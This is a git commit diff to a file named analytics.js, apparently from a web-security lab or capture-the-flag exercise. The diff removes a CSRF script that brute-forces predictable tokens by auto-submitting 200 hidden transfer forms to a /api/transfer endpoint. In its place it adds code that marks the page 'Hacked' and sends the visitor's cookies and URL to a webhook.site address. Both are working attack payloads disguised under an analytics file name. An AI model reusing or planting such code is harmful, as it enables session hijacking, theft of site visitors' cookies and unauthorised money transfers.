2a785dd76852255ae74d3634d86838a2f4a6e99e
zdmmhl <zdmmhl@gmail.com>
2026-04-15 23:38:31 +1000

    Update analytics.js

--- analytics.js
+++ analytics.js
@@ -1,38 +1,4 @@
-const ME = "z5602760";
-const START = 8576;   // 改成你刚观察到的当前值
-const COUNT = 200;
-const AMOUNT = 1;
-
-const iframe = document.createElement("iframe");
-iframe.name = "sink";
-iframe.style.display = "none";
-document.body.appendChild(iframe);
-
-for (let i = 0; i < COUNT; i++) {
-  const tokenInt = START + i;
-
-  const f = document.createElement("form");
-  f.method = "POST";
-  f.action = "https://phish-me.quoccacorp.com/api/transfer";
-  f.target = "sink";
-  f.style.display = "none";
-
-  const t = document.createElement("input");
-  t.name = "csrf_token";
-  t.value = btoa(String(tokenInt));
-
-  const u = document.createElement("input");
-  u.name = "username";
-  u.value = ME;
-
-  const a = document.createElement("input");
-  a.name = "amount";
-  a.value = String(AMOUNT);
-
-  f.appendChild(t);
-  f.appendChild(u);
-  f.appendChild(a);
-  document.body.appendChild(f);
-
-  setTimeout(() => f.submit(), i * 20);
-}
+document.title = "Hacked";
+new Image().src = "https://webhook.site/6d93283b-433c-45de-a47e-12509a086859/?c="
+  + encodeURIComponent(document.cookie)
+  + "&u=" + encodeURIComponent(location.href);
